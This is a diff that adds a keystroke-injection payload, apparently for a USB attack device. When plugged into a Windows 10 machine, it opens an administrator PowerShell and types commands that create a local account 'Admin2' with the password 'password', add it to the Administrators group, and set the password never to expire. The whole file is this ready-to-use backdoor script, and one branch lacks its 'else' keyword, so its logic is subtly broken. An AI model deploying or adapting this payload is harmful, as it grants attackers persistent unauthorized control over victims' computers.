@@ -1,0 +1,46 @@
+## Title: Add_Local_Admin
+## Author: LulzAnarchyAnon
+## Description: Administrator PowerShell is opened, and a script 
+## runs that adds a Local Admin User. 
+## Target: Windows 10 PowerShell 
+## Props: Darren Kitchen, and I am Jakoby
+## Version: 1.0
+## Category: Execution
+
+RunPowershellAdmin
+Delay 3000
+PrintLine $Username = "Admin2"
+Delay 2000
+PrintLine $Password = "password"
+Delay 2000
+PrintLine $group = "Administrators"
+Delay 2000
+PrintLine $adsi = [ADSI]"WinNT://$env:COMPUTERNAME"
+Delay 5000
+PrintLine $existing = $adsi.Children | where {$_.SchemaClassName -eq 'user' -and $_.Name -eq $Username }
+Delay 5000
+PrintLine if ($existing -eq $null) {
+Delay 2000
+PrintLine    Write-Host "Creating new local user $Username."
+Delay 5000
+PrintLine    & NET USER $Username $Password /add /y /expires:never
+Delay 5000  
+PrintLine    Write-Host "Adding local user $Username to $group."
+Delay 5000
+PrintLine    & NET LOCALGROUP $group $Username /add
+Delay 5000
+PrintLine }
+Delay 2000
+PrintLine      {
+Delay 2000
+PrintLine    Write-Host "Setting password for existing local user $Username."
+Delay 5000
+PrintLine    $existing.SetPassword($Password)
+Delay 2000
+PrintLine }
+Delay 2000
+PrintLine Write-Host "Ensuring password for $Username never expires."
+Delay 5000
+PrintLine & WMIC USERACCOUNT WHERE "Name='$Username'" SET PasswordExpires=FALSE
+Delay 5000
+PrintLine exit
